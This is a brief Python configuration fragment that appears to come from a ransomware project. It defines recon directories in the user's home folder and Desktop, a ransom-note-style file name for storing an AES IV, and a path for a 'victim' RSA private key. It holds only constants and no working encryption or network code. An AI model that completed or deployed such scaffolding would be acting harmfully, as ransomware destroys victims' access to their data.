import os

# passing the introduction section
pass_the_introduction = 7

# the beginning point of recon
root_directory = os.path.expanduser('~')
desktop_directory = os.path.join(root_directory,"Desktop")
root_directory = os.path.join(root_directory,"test")

aesIV_file_store_name = "HEYY_APTAl_READ_ME.txt"
dec_aesIV_file_store_name = "decrypted_iv_file.txt"

rsa_private_key_path = "victimNumber_rsa_private_key"